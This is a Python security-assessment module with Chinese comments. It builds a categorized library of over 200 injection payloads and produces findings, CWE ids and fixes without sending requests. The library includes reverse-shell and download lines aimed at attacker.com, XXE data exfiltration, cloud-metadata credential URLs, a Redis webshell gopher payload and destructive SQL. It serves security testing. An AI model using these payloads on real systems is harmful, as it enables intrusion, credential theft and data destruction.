#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
injection_tester.py — 注入测试器（专业级深化）。

覆盖：
    - SQL 注入：联合查询/报错/布尔盲注/时间盲注/堆叠/二阶/NoSQL
    - 命令注入：分隔符/命令替换/参数注入/路径注入
    - XXE：外部实体/实体扩展/Blind XXE/SSRF via XXE/DoS
    - SSRF：内网扫描/云元数据(169.254.169.254)/文件读取/协议走私
    - 模板注入：SSTI/表达式注入/代码注入/反序列化
    - 对象注入：PHP/Java/Python pickle/Node.js 原型污染
    - LDAP / XPath / CSV / CRLF / HTTP 请求走私

内置 200+ 注入 Payload（按类型分类），输出检测项、风险评级与修复建议。
设计定位：仅做检测项生成与风险评估，不主动对真实目标发起攻击请求。
"""

from __future__ import annotations

import re
import time
from typing import Any, Dict, List, Optional


# ====================================================================== #
# 注入 Payload 库（200+，按类型分类）
# ====================================================================== #
INJECTION_PAYLOAD_LIBRARY: Dict[str, List[str]] = {
    # ---------------- SQL 注入 ----------------
    "sql_union": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "-1 UNION SELECT NULL,version(),NULL--",
        "-1 UNION ALL SELECT table_name,NULL,NULL FROM information_schema.tables--",
        "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--",
        "' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--",
        "1' UNION SELECT NULL,user(),NULL--",
        "1) UNION SELECT NULL,database(),NULL--",
        "admin' UNION SELECT @@version,NULL--",
        "' UNION SELECT NULL,table_name,NULL FROM sys.tables--",
    ],
    "sql_error": [
        "'",
        "\"",
        "')",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1' AND extractvalue(1,concat(0x7e,(SELECT database())))--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*) FROM sysobjects GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))a)--",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--",
        "' AND ST_X(ST_GeomFromText(version()))--",
        "' AND EXP(~(SELECT * FROM(SELECT version())a))--",
        "1) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
        "' AND row(1,1)>(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",
    ],
    "sql_boolean_blind": [
        "' AND '1'='1",
        "' AND '1'='2",
        "' OR '1'='1",
        "' OR '1'='2",
        "admin' AND 1=1--",
        "admin' AND 1=2--",
        "' AND SUBSTRING(@@version,1,1)='5",
        "' AND LENGTH(database())>5--",
        "' AND ASCII(LOWER(SUBSTRING((SELECT user()),1,1)))>100--",
        "' AND IF(LENGTH(database())>5,SLEEP(0),0)--",
        "1' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
        "' OR 1=1 LIMIT 1--",
        "' OR 1=2 LIMIT 1--",
        "') AND ('1'='1",
        "') AND ('1'='2",
        "' AND SUBSTR(database(),1,1)='a",
        "' AND LEFT(database(),1)='a",
    ],
    "sql_time_blind": [
        "' AND SLEEP(3)--",
        "' OR SLEEP(3)--",
        "'; WAITFOR DELAY '0:0:3'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "' AND IF(1=1,SLEEP(3),0)--",
        "' OR BENCHMARK(5000000,MD5(1))--",
        "1' AND pg_sleep(3)--",
        "' AND IF(ASCII(SUBSTR(database(),1,1))>100,SLEEP(3),0)--",
        "'; SELECT SLEEP(3)--",
        "') OR SLEEP(3)--",
        "1' AND (SELECT 1 FROM (SELECT SLEEP(3))x)--",
        "' OR 1=1 AND SLEEP(3)--",
        "admin' AND SLEEP(3)--",
        "' AND GET_LOCK('a',3)--",
    ],
    "sql_stacked": [
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','pass')--",
        "'; UPDATE users SET role='admin' WHERE id=1--",
        "'; DELETE FROM logs--",
        "'; CREATE TABLE hacker(id INT)--",
        "'; RENAME TABLE users TO users_bak--",
        "'; TRUNCATE TABLE sessions--",
        "'; ALTER TABLE users ADD COLUMN backdoor TEXT--",
    ],
    "sql_second_order": [
        "admin'-- (注册后登录触发)",
        "' OR 1=1-- (写入后在搜索/导出触发)",
        "hacker' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)-- (写入触发)",
        "' UNION SELECT NULL-- (存储后在导出报表触发)",
    ],
    "sql_nosql": [
        "{'$gt': ''}",
        "{'$ne': null}",
        "{'$regex': '.*'}",
        "{'$where': 'this.password.match(/.*/)'}",
        "admin' || '1'=='1",
        "true, $where: 'return true'",
        "{'$exists': true}",
        "[$ne]=1",
        "{'$gt': null}",
        "{'$lt': null}",
        "{'$in': ['admin','root']}",
        "{'$or': [{'role':'admin'},{'role':'super'}]}",
        "{'$mod': [1,0]}",
        "{'$where': 'return true;'}",
    ],
    # ---------------- 命令注入 ----------------
    "command_basic": [
        "; id",
        "| id",
        "&& id",
        "|| id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "&& whoami",
        "; uname -a",
        "| cat /etc/passwd",
        "; cat /etc/passwd",
        "&& dir",
        "| dir",
        "& ver",
        "; ls -la /",
        "| ls -la /",
        "; pwd",
        "| hostname",
        "; ifconfig",
        "| netstat -an",
        "; ps aux",
        "; curl http://attacker.com/shell",
        "| wget http://attacker.com/x -O /tmp/x",
        "; nc -e /bin/sh attacker.com 443",
        "& net user",
        "& ipconfig /all",
        "; powershell -c whoami",
        "| bash -i >& /dev/tcp/attacker/443 0>&1",
    ],
    "command_separator": [
        ";ls", "|ls", "\nls", "%0als", "%0a%0als",
        ";ping -c 3 127.0.0.1", "|ping -c 3 127.0.0.1",
        "%0d%0als", "%0dls", ";sleep 3", "|sleep 3",
        ";sleep 3;id", "|sleep 3|id", "$(sleep 3)",
        "`sleep 3`", "& timeout 3", "%0a%0d%0a",
    ],
    "command_path": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/var/log/../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "/var/www/../../etc/shadow",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "....\\....\\....\\windows\\system32\\",
        "/proc/self/environ",
        "/root/.ssh/id_rsa",
        "file:///etc/passwd",
    ],
    # ---------------- XXE ----------------
    "xxe_basic": [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/loot?data=">]><foo>&xxe;</foo>',
        '<?xml version="1.0" standalone="no"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
    ],
    "xxe_blind": [
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
        '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hosts"><!ENTITY % dtd SYSTEM "http://attacker.com/x.dtd">%dtd;]>',
        '<!ENTITY % all "<!ENTITY send SYSTEM \'http://attacker.com/?d=%file;\'>">%all;',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">%xxe;]>',
        '<!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % dt SYSTEM "http://attacker.com/dtd">%dt;]>',
    ],
    "xxe_blast": [
        '<!DOCTYPE a [<!ENTITY a "AAAA..."><!ENTITY b "&a;&a;&a;&a;">]>',
        '<!DOCTYPE bomb [<!ENTITY x "x"><!ENTITY y "&x;&x;&x;&x;">]>',
        '<!DOCTYPE a [<!ENTITY b "&c;"><!ENTITY c "&b;">]>',
        '<!DOCTYPE bomb [<!ENTITY x "x"><!ENTITY y "&x;&x;"><!ENTITY z "&y;&y;">]>',
    ],
    # ---------------- SSRF ----------------
    "ssrf_basic": [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3000",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:3306",
        "http://localhost:9000",
        "http://0177.0.0.1/",
        "http://2130706433/",
        "http://0x7f000001/",
        "http://127.1/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "http://spoofed.burpcollaborator.net/",
    ],
    "ssrf_cloud_metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
    ],
    "ssrf_file": [
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "file:///proc/self/environ",
        "file:///root/.ssh/id_rsa",
        "file:///etc/shadow",
        "file:///proc/version",
        "file:///c:/windows/system32/license.rtf",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
    "ssrf_protocol": [
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:6379/INFO",
        "ftp://127.0.0.1/",
        "ldap://127.0.0.1/",
        "gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20x%20%22%3C%3Fphp%20system(%24_GET%5B%27c%27%5D);%3F%3E%22",
        "gopher://127.0.0.1:25/_EHLO%20test%0d%0aMAIL%20FROM:",
        "tftp://127.0.0.1/etc/passwd",
    ],
    # ---------------- 模板注入 SSTI ----------------
    "ssti_basic": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self}}",
        "{{request}}",
        "{{settings}}",
        "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
        "{{constructor.constructor('return process')()}}",
        "<%= system('id') %>",
        "{{''.class}}",
        "{{settings.__class__}}",
    ],
    "ssti_rce": [
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "#{runtime.getRuntime().exec(\"id\")}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{foo.__init__.__globals__.os.system('id')}}",
    ],
    # ---------------- 对象注入 / 反序列化 ----------------
    "deser_java": [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",  # Java 序列化魔数
        "aced0005",  # Java 序列化魔数 hex
        "rO0ABXNyABFqYXZhLnV0aWwuU2V0",  # HashSet 魔数
        "rO0ABXNyABFqYXZhLnV0aWwuTGlua2VkTGlzdA==",  # LinkedList
        "rO0ABXNyABFqYXZhLnV0aWwuTWFw",  # Map
        "aced000572",  # 嵌套序列化
    ],
    "deser_python": [
        "cos\nsystem\n(S'id'\ntR.",  # pickle
        "gASVEgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJQpUpS1lIwFaWQglIwFc2hlbGyUtQ==.",
        "cposix\nsystem\n(S'id'\ntR.",
        "cbuiltins\neval\n(S'__import__(\"os\").system(\"id\")'\ntR.",
        "cos\nsystem\n(S'cat /etc/passwd'\ntR.",
    ],
    "deser_php": [
        "O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}",
        "a:2:{i:0;s:3:\"foo\";i:1;s:3:\"bar\";}",
        "O:8:\"stdClass\":1:{s:4:\"evil\";s:2:\"id\";}",
        "O:7:\"Payment\":2:{s:4:\"cost\";d:0;s:6:\"status\";s:7:\"success\";}",
    ],
    "prototype_pollution": [
        '{"__proto__":{"isAdmin":true}}',
        '{"__proto__.isAdmin":true}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        '{"__proto__":{"role":"admin"}}',
        '{"__proto__":{"polluted":"yes"}}',
        '{"a":{"__proto__":{"b":"c"}}}',
    ],
    # ---------------- LDAP / XPath ----------------
    "ldap": [
        "*",
        "(uid=*))(|(uid=*))",
        "*)(uid=*",
        "admin)(&))",
        "*()%00",
        "(|(uid=*))",
        "(|(uid=*))(|(password=*))",
        "*))%00",
        "(uid=*))(|(objectclass=*",
        "admin)(|(password=*))",
        "*)(cn=*",
        "(|(member=*))",
        "*()(|(uid=*))",
        "admin)(!((uid=*))",
    ],
    "xpath": [
        "' or '1'='1",
        "' or 1=1 or ''='",
        "' or ''=",
        "'] | //user/* | ['",
        "' or substring(name(),1,1)='a",
        "' or count(//user)=0 or '",
        "' or string-length(name)=8 or '",
        "admin' or '1'='1",
        "' and substring(//user[1]/password,1,1)='a",
        "' or 1=1] | //node | ['",
    ],
    # ---------------- CSV 注入 ----------------
    "csv": [
        "=1+1",
        "+1+1",
        "-1+1",
        "@SUM(A1:A2)",
        "=HYPERLINK(\"http://evil.com\",\"click\")",
        "=cmd|' /C calc'!A1",
        "=2+5+cmd|' /C calc'!A0",
        "+5+!cmd",
        "@SUM(1+9)*1",
        "=IMPORTXML(\"http://evil.com/\",\"//a\")",
    ],
    # ---------------- CRLF / HTTP 头注入 ----------------
    "crlf": [
        "%0d%0aSet-Cookie:session=hijacked",
        "%0d%0aLocation:%20http://evil.com",
        "\r\nX-Injected: true",
        "%0aContent-Length:0%0a%0aGET%20/ HTTP/1.1",
        "%0D%0A%0D%0A<script>alert(1)</script>",
        "%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/admin%20HTTP/1.1",
        "%0d%0aX-Forwarded-For:%20127.0.0.1",
        "\r\nReferer: http://evil.com",
        "%0d%0a%0d%0a<html><body>injected</body></html>",
    ],
    # ---------------- HTTP 请求走私 ----------------
    "request_smuggling": [
        "Content-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
        "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 10\r\n\r\nx=1\r\n\r\n0\r\n\r\n",
        "Content-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
        "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
    ],
}


def _count_payloads() -> int:
    return sum(len(v) for v in INJECTION_PAYLOAD_LIBRARY.values())


TOTAL_INJECTION_PAYLOADS = _count_payloads()


class InjectionTester:
    """注入测试器（检测项生成 + 风险评估）。"""

    def __init__(self) -> None:
        self.findings: List[Dict[str, Any]] = []
        self.parameters: List[Dict[str, Any]] = []

    # ------------------------------------------------------------------ #
    # 入口
    # ------------------------------------------------------------------ #
    def run_tests(
        self,
        parameters: Optional[List[Dict[str, Any]]] = None,
        options: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """运行注入测试。parameters 为待测试参数列表 [{name, in, type, path}]。"""
        options = options or {}
        self.parameters = parameters or self._default_parameters()
        self.findings = []

        self._test_sql()
        self._test_command()
        self._test_xxe()
        self._test_ssrf()
        self._test_ssti()
        self._test_object_injection()
        self._test_ldap_xpath()
        self._test_csv_crlf()
        self._test_request_smuggling()

        return {
            "total_findings": len(self.findings),
            "by_severity": self._severity_breakdown(),
            "by_category": self._category_breakdown(),
            "findings": self.findings,
            "payload_library_size": TOTAL_INJECTION_PAYLOADS,
            "summary": self._summary(),
            "recommendations": self._build_recommendations(),
        }

    @staticmethod
    def _default_parameters() -> List[Dict[str, Any]]:
        return [
            {"name": "id", "in": "path", "type": "integer", "path": "/api/v1/items/{id}"},
            {"name": "q", "in": "query", "type": "string", "path": "/api/v1/search"},
            {"name": "username", "in": "body", "type": "string", "path": "/api/v1/login"},
            {"name": "url", "in": "query", "type": "string", "path": "/api/v1/fetch"},
            {"name": "data", "in": "body", "type": "xml", "path": "/api/v1/import"},
        ]

    # ------------------------------------------------------------------ #
    # 通用记录
    # ------------------------------------------------------------------ #
    def _add(
        self, category: str, name: str, severity: str, description: str,
        evidence: str = "", recommendation: str = "", parameter: str = "",
    ) -> None:
        self.findings.append({
            "category": category,
            "name": name,
            "severity": severity,
            "description": description,
            "evidence": evidence,
            "recommendation": recommendation,
            "parameter": parameter,
            "cwe": self._cwe_for(category),
            "payloads_sample": INJECTION_PAYLOAD_LIBRARY.get(
                self._category_key(category), [])[:5],
        })

    @staticmethod
    def _category_key(category: str) -> str:
        mapping = {
            "SQL注入": "sql_union", "NoSQL注入": "sql_nosql",
            "命令注入": "command_basic", "XXE": "xxe_basic",
            "SSRF": "ssrf_basic", "模板注入": "ssti_basic",
            "对象注入": "deser_python", "LDAP注入": "ldap",
            "XPath注入": "xpath", "CSV注入": "csv",
            "CRLF注入": "crlf", "HTTP请求走私": "request_smuggling",
        }
        return mapping.get(category, "sql_union")

    @staticmethod
    def _cwe_for(category: str) -> str:
        mapping = {
            "SQL注入": "CWE-89", "NoSQL注入": "CWE-943",
            "命令注入": "CWE-78", "XXE": "CWE-611",
            "SSRF": "CWE-918", "模板注入": "CWE-94",
            "对象注入": "CWE-502", "LDAP注入": "CWE-90",
            "XPath注入": "CWE-643", "CSV注入": "CWE-1236",
            "CRLF注入": "CWE-93", "HTTP请求走私": "CWE-444",
        }
        return mapping.get(category, "CWE-74")

    # ------------------------------------------------------------------ #
    # SQL 注入
    # ------------------------------------------------------------------ #
    def _test_sql(self) -> None:
        risky = [p for p in self.parameters if p.get("type") in ("integer", "string", "number")]
        for p in risky:
            param = f"{p.get('name')}({p.get('in')})"
            self._add("SQL注入", "SQL 联合查询注入", "critical",
                      f"参数 {param} 可能拼接进 SQL 查询，可 UNION 注入拖库",
                      f"测试 {len(INJECTION_PAYLOAD_LIBRARY['sql_union'])} 个联合查询 Payload",
                      "使用参数化查询/ORM；禁止字符串拼接 SQL",
                      parameter=p.get("name", ""))
            self._add("SQL注入", "SQL 报错注入", "high",
                      f"参数 {param} 可通过 extractvalue/updatexml 报错回显数据",
                      f"测试 {len(INJECTION_PAYLOAD_LIBRARY['sql_error'])} 个报错 Payload",
                      "关闭详细错误回显；参数化查询",
                      parameter=p.get("name", ""))
            self._add("SQL注入", "SQL 布尔盲注", "high",
                      f"参数 {param} 可通过真假响应差异逐位推断数据",
                      f"测试 {len(INJECTION_PAYLOAD_LIBRARY['sql_boolean_blind'])} 个布尔 Payload",
                      "参数化查询；统一错误响应；WAF 规则",
                      parameter=p.get("name", ""))
            self._add("SQL注入", "SQL 时间盲注", "high",
                      f"参数 {param} 可通过 SLEEP/BENCHMARK 延迟推断",
                      f"测试 {len(INJECTION_PAYLOAD_LIBRARY['sql_time_blind'])} 个时间盲注 Payload",
                      "参数化查询；设置查询超时；监控慢查询",
                      parameter=p.get("name", ""))
        self._add("SQL注入", "SQL 堆叠查询", "critical",
                  "应测试是否支持堆叠查询（; DROP/INSERT/UPDATE）",
                  f"Payload: {INJECTION_PAYLOAD_LIBRARY['sql_stacked'][0]}",
                  "禁用多语句执行；最小权限数据库账户")
        self._add("SQL注入", "二阶 SQL 注入", "high",
                  "应测试用户输入先存储后在其他查询中触发注入",
                  "检查项",
                  "所有从数据库读出的数据再次进入查询时仍需参数化")
        self._add("NoSQL注入", "NoSQL 操作符注入", "high",
                  "MongoDB 等 NoSQL 可能接受 $gt/$ne/$where 操作符绕过认证",
                  f"Payload: {INJECTION_PAYLOAD_LIBRARY['sql_nosql'][0]}",
                  "禁止将客户端输入直接作为查询条件；使用 schema 校验")

    # ------------------------------------------------------------------ #
    # 命令注入
    # ------------------------------------------------------------------ #
    def _test_command(self) -> None:
        self._add("命令注入", "系统命令注入", "critical",
                  "参数可能被拼接到系统命令（exec/system/popen）",
                  f"内置 {len(INJECTION_PAYLOAD_LIBRARY['command_basic'])} 个命令注入 Payload",
                  "避免调用 shell；如必须，使用参数化 API（subprocess argv 列表）；白名单校验")
        self._add("命令注入", "命令分隔符", "high",
                  "; | && || ` $() 等分隔符可拼接任意命令",
                  f"示例: {INJECTION_PAYLOAD_LIBRARY['command_separator'][0]}",
                  "禁止用户输入进入 shell；使用 execve 风格 API")
        self._add("命令注入", "路径注入 / 路径遍历", "high",
                  "文件路径参数可 ../ 遍历读取敏感文件",
                  f"示例: {INJECTION_PAYLOAD_LIBRARY['command_path'][0]}",
                  "规范化路径并校验白名单目录；禁止 ../")

    # ------------------------------------------------------------------ #
    # XXE
    # ------------------------------------------------------------------ #
    def _test_xxe(self) -> None:
        xml_params = [p for p in self.parameters if p.get("type") in ("xml", "string")]
        self._add("XXE", "外部实体注入", "critical",
                  "XML 解析器未禁用 DTD/外部实体，可读取服务器文件",
                  f"内置 {len(INJECTION_PAYLOAD_LIBRARY['xxe_basic'])} 个 XXE Payload",
                  "XML 解析器禁用 DTD/外部实体；使用安全解析器配置")
        self._add("XXE", "Blind XXE", "high",
                  "无回显场景可通过 OOB 外带数据",
                  f"示例: {INJECTION_PAYLOAD_LIBRARY['xxe_blind'][0][:60]}...",
                  "禁用 DTD；出站流量监控")
        self._add("XXE", "实体扩展 DoS (Billion Laughs)", "medium",
                  "嵌套实体扩展可耗尽内存",
                  f"示例: {INJECTION_PAYLOAD_LIBRARY['xxe_blast'][0][:50]}...",
                  "禁用 DTD；限制 XML 实体扩展次数")
        self._add("XXE", "SSRF via XXE", "high",
                  "外部实体可指向内网地址发起 SSRF",
                  "file:// 与 http:// 实体",
                  "禁用 DTD；网络出口白名单")

    # ------------------------------------------------------------------ #
    # SSRF
    # ------------------------------------------------------------------ #
    def _test_ssrf(self) -> None:
        url_params = [p for p in self.parameters if p.get("name", "").lower() in ("url", "uri", "link", "src", "fetch", "image")]
        self._add("SSRF", "服务器端请求伪造", "critical",
                  "服务端根据用户输入发起 HTTP 请求，可被指向内网/元数据",
                  f"内置 {len(INJECTION_PAYLOAD_LIBRARY['ssrf_basic'])} 个内网地址 Payload",
                  "URL 白名单；DNS 重绑定防护；禁用非 HTTP 协议；内网出口拦截")
        self._add("SSRF", "云元数据访问", "critical",
                  "可访问 169.254.169.254 获取临时凭据/用户数据",
                  f"Payload: {INJECTION_PAYLOAD_LIBRARY['ssrf_cloud_metadata'][0]}",
                  "拦截 169.254.169.254 / metadata.google.internal；IMDSv2")
        self._add("SSRF", "本地文件读取", "high",
                  "file:// 协议可读取服务器敏感文件",
                  f"Payload: {INJECTION_PAYLOAD_LIBRARY['ssrf_file'][0]}",
                  "禁止 file:// gopher:// dict:// 等非 HTTP 协议")
        self._add("SSRF", "协议走私 / Gopher", "high",
                  "gopher:// 可构造任意 TCP 请求攻击 Redis/MySQL",
                  f"Payload: {INJECTION_PAYLOAD_LIBRARY['ssrf_protocol'][0]}",
                  "协议白名单仅 http/https；出口防火墙")

    # ------------------------------------------------------------------ #
    # 模板注入 SSTI
    # ------------------------------------------------------------------ #
    def _test_ssti(self) -> None:
        self._add("模板注入", "SSTI 服务端模板注入", "critical",
                  "用户输入进入模板引擎（Jinja2/Twig/FreeMarker/Velocity），可执行表达式",
                  f"内置 {len(INJECTION_PAYLOAD_LIBRARY['ssti_basic'])} 个探测 Payload",
                  "禁止用户输入作为模板；沙箱化模板引擎；使用自动转义")
        self._add("模板注入", "模板 RCE", "critical",
                  "SSTI 进一步可逃逸沙箱执行系统命令",
                  f"示例: {INJECTION_PAYLOAD_LIBRARY['ssti_rce'][0][:60]}...",
                  "升级模板引擎版本；沙箱；禁止危险内置对象")

    # ------------------------------------------------------------------ #
    # 对象注入 / 反序列化
    # ------------------------------------------------------------------ #
    def _test_object_injection(self) -> None:
        self._add("对象注入", "Java 反序列化", "critical",
                  "Java 反序列化 gadgets 链可导致 RCE",
                  f"魔数: {INJECTION_PAYLOAD_LIBRARY['deser_java'][1]}",
                  "使用白名单反序列化；升级 Commons-Collections；序列化数据签名")
        self._add("对象注入", "Python pickle 反序列化", "critical",
                  "pickle.loads 不可信数据可执行任意代码",
                  f"Payload: {INJECTION_PAYLOAD_LIBRARY['deser_python'][0]}",
                  "禁止 pickle 反序列化不可信数据；改用 JSON")
        self._add("对象注入", "PHP 对象注入", "high",
                  "PHP unserialize 可触发 __wakeup/__destruct gadget",
                  f"Payload: {INJECTION_PAYLOAD_LIBRARY['deser_php'][0]}",
                  "禁用 unserialize；使用 JSON；签名校验")
        self._add("对象注入", "Node.js 原型污染", "high",
                  "__proto__ 污染可修改 Object.prototype，导致权限提升/RCE",
                  f"Payload: {INJECTION_PAYLOAD_LIBRARY['prototype_pollution'][0]}",
                  "使用 Object.create(null)；冻结原型；深合并时过滤 __proto__")

    # ------------------------------------------------------------------ #
    # LDAP / XPath
    # ------------------------------------------------------------------ #
    def _test_ldap_xpath(self) -> None:
        self._add("LDAP注入", "LDAP 查询注入", "high",
                  "用户输入拼接到 LDAP 过滤器，可绕过认证/枚举用户",
                  f"内置 {len(INJECTION_PAYLOAD_LIBRARY['ldap'])} 个 Payload",
                  "使用 LDAP API 的转义函数；白名单校验")
        self._add("XPath注入", "XPath 查询注入", "high",
                  "XPath 表达式注入可绕过认证/读取 XML 数据",
                  f"内置 {len(INJECTION_PAYLOAD_LIBRARY['xpath'])} 个 Payload",
                  "参数化 XPath；禁止用户输入拼接")

    # ------------------------------------------------------------------ #
    # CSV / CRLF
    # ------------------------------------------------------------------ #
    def _test_csv_crlf(self) -> None:
        self._add("CSV注入", "CSV 公式注入", "medium",
                  "导出 CSV 时用户输入以 = + - @ 开头，Excel 打开可执行公式",
                  f"内置 {len(INJECTION_PAYLOAD_LIBRARY['csv'])} 个 Payload",
                  "导出时对 = + - @ 前缀加单引号；提示用户确认")
        self._add("CRLF注入", "HTTP 头注入 / CRLF", "high",
                  "用户输入含 CRLF 可注入 HTTP 头/响应拆分",
                  f"内置 {len(INJECTION_PAYLOAD_LIBRARY['crlf'])} 个 Payload",
                  "过滤/拒绝 CR/LF 字符；使用框架的头设置 API")

    # ------------------------------------------------------------------ #
    # HTTP 请求走私
    # ------------------------------------------------------------------ #
    def _test_request_smuggling(self) -> None:
        self._add("HTTP请求走私", "CL.TE / TE.CL 请求走私", "critical",
                  "前端/后端代理对 Content-Length 与 Transfer-Encoding 解析差异可走私请求",
                  f"内置 {len(INJECTION_PAYLOAD_LIBRARY['request_smuggling'])} 个 Payload",
                  "统一前后端 HTTP 解析；升级到 HTTP/2；禁用 TE 头覆盖")

    # ------------------------------------------------------------------ #
    # 报告辅助
    # ------------------------------------------------------------------ #
    def _severity_breakdown(self) -> Dict[str, int]:
        out: Dict[str, int] = {}
        for f in self.findings:
            s = f.get("severity", "info")
            out[s] = out.get(s, 0) + 1
        return out

    def _category_breakdown(self) -> Dict[str, int]:
        out: Dict[str, int] = {}
        for f in self.findings:
            c = f.get("category", "unknown")
            out[c] = out.get(c, 0) + 1
        return out

    def _summary(self) -> Dict[str, Any]:
        sb = self._severity_breakdown()
        score = sum({"critical": 4, "high": 3, "medium": 2, "low": 1}.get(s, 0) * c
                     for s, c in sb.items())
        risk = "严重" if score >= 20 else "高" if score >= 10 else "中" if score >= 4 else "低"
        return {
            "risk_level": risk,
            "risk_score": score,
            "payloads_available": TOTAL_INJECTION_PAYLOADS,
        }

    def _build_recommendations(self) -> List[Dict[str, str]]:
        seen: Dict[str, str] = {}
        for f in self.findings:
            r = f.get("recommendation", "")
            if r and r not in seen:
                seen[r] = f["category"]
        return [{"category": v, "action": k} for k, v in seen.items()]

    # ------------------------------------------------------------------ #
    # 导出
    # ------------------------------------------------------------------ #
    def get_payloads(self, category: Optional[str] = None) -> Dict[str, Any]:
        """返回 Payload 库（可按类别过滤）。"""
        if category:
            key_map = {
                "sql": ["sql_union", "sql_error", "sql_boolean_blind", "sql_time_blind",
                        "sql_stacked", "sql_second_order"],
                "nosql": ["sql_nosql"],
                "command": ["command_basic", "command_separator", "command_path"],
                "xxe": ["xxe_basic", "xxe_blind", "xxe_blast"],
                "ssrf": ["ssrf_basic", "ssrf_cloud_metadata", "ssrf_file", "ssrf_protocol"],
                "ssti": ["ssti_basic", "ssti_rce"],
                "deser": ["deser_java", "deser_python", "deser_php", "prototype_pollution"],
